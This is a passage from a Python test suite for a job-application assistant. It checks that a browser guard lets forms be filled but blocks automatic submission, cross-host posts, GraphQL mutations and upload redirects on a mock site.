        self.assertTrue(remove.state["released"])                                     # only a genuine click does

    def test_permitted_uploads_cannot_redirect_data_to_another_address(self):
        page, remove, report = self.guarded_fill("/change-upload-redirect")
        page.wait_for_timeout(500)
        self.assertEqual([p for p in self.site.posts if p[0] == "B"], [])        # the other host never received the file bytes
        self.assertTrue(any(item.startswith("redirecting upload") for item in remove.blocked))

    def test_unrecognised_write_requests_and_cross_host_posts_are_denied_by_default(self):
        for path in ("/change-graphql", "/change-crosshost"):
            with self.subTest(path=path):
                self.site.posts.clear()
                page, remove, report = self.guarded_fill(path)
                self.assertEqual(self.site.posts, [], path)                      # neither the generic endpoint nor the other host received anything
                if path == "/change-graphql": self.assertTrue(any(item.startswith("POST") for item in remove.blocked))
                else: self.assertTrue(any(item.startswith("third-party") for item in remove.blocked))   # reported separately: silent for the person
                page.close()

    def test_graphql_reads_and_upload_handles_pass_but_submissions_and_other_mutations_do_not(self):
        page, remove, report = self.guarded_fill("/ashby-load")
        page.wait_for_timeout(500)
        self.assertEqual(sorted(p for _, p in self.site.posts), ["/api/non-user-graphql?op=ApiCreateFileUploadHandle", "/api/non-user-graphql?op=ApiJobPosting"])
        self.assertEqual(remove.blocked, [])
        self.site.posts.clear()
        page2, remove2, _ = self.guarded_fill("/ashby-submit")
        page2.wait_for_timeout(500)
        self.assertEqual(self.site.posts, []); self.assertTrue(any("non-user-graphql" in item for item in remove2.blocked))

    def test_ordinary_upload_requests_are_not_blocked(self):
        page, remove, report = self.guarded_fill("/change-upload-ok")
        self.assertEqual(self.site.posts, [("A", "/api/upload")])               # only submit-style endpoints are refused

    def test_full_assist_reports_a_blocked_submission_and_still_hands_over(self):
        import tempfile
        from getmeajob.resume.store import ProfileStore
        self.browser.close(); self.pw.stop()                                    # assist() starts its own browser
        with tempfile.TemporaryDirectory() as folder:
            store = ProfileStore(Path(folder))
            payload = {"employer": "A", "position": "D", "original_url": self.site.url("A", "/change-requestsubmit"),
                       "job": {"application_url": self.site.url("A", "/change-requestsubmit")}, "match": {"score": 1}}
            resume = store.upload("R", "r.pdf", b"%PDF-1.4 synthetic", "Synthetic", [("skills", "Python")])
            identity = store.package(1, resume, payload, "Dear A.", "reviewed"); store.set_setting("applicant", json.dumps(APPLICANT))
            with patch("getmeajob.apply_assist.check_url", self.site.allowed):
                report = aa.assist(store, identity, headless=True, wait=False, url_ok=self.site.allowed)
            self.assertTrue(any("tried to submit" in item for item in report["needs"]))
            self.assertEqual(self.site.posts, []); self.assertEqual(store.applications(identity)[0]["status"], "form_opened")
        self.pw = sync_playwright().start(); self.browser = self.pw.chromium.launch(channel="chrome", headless=True)
